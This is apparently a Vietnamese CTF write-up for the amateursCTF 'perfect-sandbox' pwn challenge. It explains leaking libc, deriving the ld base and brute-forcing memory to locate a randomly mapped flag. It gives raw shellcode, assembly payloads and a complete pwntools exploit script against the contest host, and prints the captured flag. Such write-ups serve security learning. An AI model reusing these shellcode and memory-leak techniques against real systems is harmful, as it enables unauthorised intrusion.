# perfect-sandbox
## Phân tích
- Tiếp tục một bài thực thi shellcode, tuy nhiên nó khá mất thời gian
- Khi dừng ở lệnh `jmp rax`
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/bc0a21eb-459a-454b-b05b-fd44793a38f3)
- các thanh ghi đã bị thay đổi, tuy nhiên ta vẫn có thể khai thác địa chỉ của `rax`
- Vùng nhớ flag được tạo một cách random, `/dev/urandom` ta sẽ lấy 4 byte để tạo vùng nhớ cho flag
- Việc bây giờ là tìm giá trị 4 byte ấy
- Khi đọc về cách `mmap` hoạt động thì có vẻ nó sẽ tìm từ trên xuống đến khi nào có vừng nhớ trống thì sẽ tạo ở đó
- Ví dụ `0x10-> 0x20: libc` `0x30->0x40: ld` khi ta `mmap` một vùng nhớ có size 0x10 thì nó tìm được vùng `0x20 -> 0x30` trống và tạo ở đó
- Đồng thời khi chạy trên local mình thấy một vùng địa chỉ được tạo, trong `ld` và nó có 4 byte của `/dev/urandom`
- Nhưng offset từ vị trí mình tìm được trên local khác với vị trí trên local
- Đến đây mình nảy ra ý tưởng
- Do chương trình tạo các vùng nhớ với quyền `read-write` từ những vùng nhớ trống nên mình sẽ brute-force in từ `ld base` xuống đến khi nào mình thấy một vùng dữ liệu 0x1000 có 4 byte và còn lại là null thì thấy
- Từ đây ta có hướng sau `leak libc -> libc base -> ld base (có thể) -> brute-force để tìm 4 byte -> tính địa chỉ đang chứa flag -> sys_write để in flag`

## Khai thác
### Lưu ý
- Ở đây ta không thể gửi một lần shellcode mà gửi từng phần 1. Nghĩa là khi leak libc để tiếp tục shellcode, ta cần viết vào phần kết thúc của shellcode `leak libc`. ví dụ shellcode libc leak dừng lại là 0x12a0 thì ta cần tạo shell nhập vào từ bàn phím (để thực thi brute-force) vào địa chỉ `0x12a0 + <độ dài của shell nhập vào từ bàn phím> = địa chỉ thực thi brute-force`
### Leak libc, libc base, ld base (có thể không phải nhưng nó gần ld base nhất)
```python
payload = "\x49\x89\xC7\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC6\x60\x40\x40\x00\x0F\x05\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x4C\x89\xFE\x48\x83\xC6\x3F\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
sa(b"> ", payload)
libc_leak = u64(p.recv(8))
info("libc leak: "+ hex(libc_leak))
libc.address = libc_leak - libc.sym['open']
info("libc base: " + hex(libc.address))
ld_base = libc.address + 0x254000
info("ld base: " + hex(ld_base))
print(p.recv(248))
```

### Brute-force để tìm 4 byte
```python
payload = asm(f'''
              mov rax, 0x1
              mov rdi, 0x1
              mov rsi, {hex(ld_base + 0x8000*6 - 0x1000)}
              mov rdx, 0x1000
              syscall

              mov rax, 0x0      ; tiếp tục ghi shellcode vào phần tiếp theo
              mov rdi, 0x0
              mov rsi, r15
              add rsi, 0x81
              mov rdx, 0x100
              syscall
              ''')
s(payload)
flag_addr = u64(p.recv(8))
info("flag addr: "+ hex(flag_addr))
```
- Để brute-force thì mình in 1 lần 0x8000 byte 1 lần, thay 0 trong `{hex(ld_base + 0x8000*0)}` từ 1 -> 6
```asm
mov rax, 0x1
mov rdi, 0x1
mov rsi, {hex(ld_base + 0x8000*0)}
mov rdx, 0x8000
syscall
```
### Tính toán địa chỉ chứa flag
```python
payload = asm(f'''
              mov rax, 0x1
              mov rdi, 0x1
              mov rsi, {hex((flag_addr & 0xFFFFF000)+20148224)}
              mov rdx, 0x100
              syscall
              ''')
s(payload)
```

## Fullscript 
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('./chal_patched', checksec=False)
# p = process(["gdbserver", "localhost:4001", "chal_patched"])
p = process("./chal_patched")
context.binary = exe
libc =ELF("./libc.so.6")
def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x00000000004013bf
                b* 0x0000000000401591
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('amt.rs', 31173)

# payload = asm('''
        #       mov r15, rax
        #       mov rax, 0x1
        #       mov rdi, 0x1
        #       mov rdx, 0x100
        #       mov rsi, 0x404060
        #       syscall
        #       mov rax, 0x0
        #       mov rdi, 0x0
        #       mov rsi, r15
        #       add rsi, 0x3f
        #       mov rdx, 0x100
        #       syscall
#               ''')
payload = "\x49\x89\xC7\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC6\x60\x40\x40\x00\x0F\x05\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x4C\x89\xFE\x48\x83\xC6\x3F\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"

GDB()
sa(b"> ", payload)
libc_leak = u64(p.recv(8))
info("libc leak: "+ hex(libc_leak))
libc.address = libc_leak - libc.sym['open']
info("libc base: " + hex(libc.address))
ld_base = libc.address + 0x254000
info("ld base: " + hex(ld_base))
print(p.recv(248))

payload = asm(f'''
              mov rax, 0x1
              mov rdi, 0x1
              mov rsi, {hex(ld_base + 0x8000*6 - 0x1000)}
              mov rdx, 0x1000
              syscall
              mov rax, 0x0
              mov rdi, 0x0
              mov rsi, r15
              add rsi, 0x81
              mov rdx, 0x100
              syscall
              ''')
s(payload)
flag_addr = u64(p.recv(8))
info("flag addr: "+ hex(flag_addr))
payload = asm(f'''
              mov rax, 0x1
              mov rdi, 0x1
              mov rsi, {hex((flag_addr & 0xFFFFF000)+20148224)}
              mov rdx, 0x100
              syscall
              ''')
s(payload)
p.interactive()
# amateursCTF{3xc3pt10n_suppr3ss10n_ftw}
```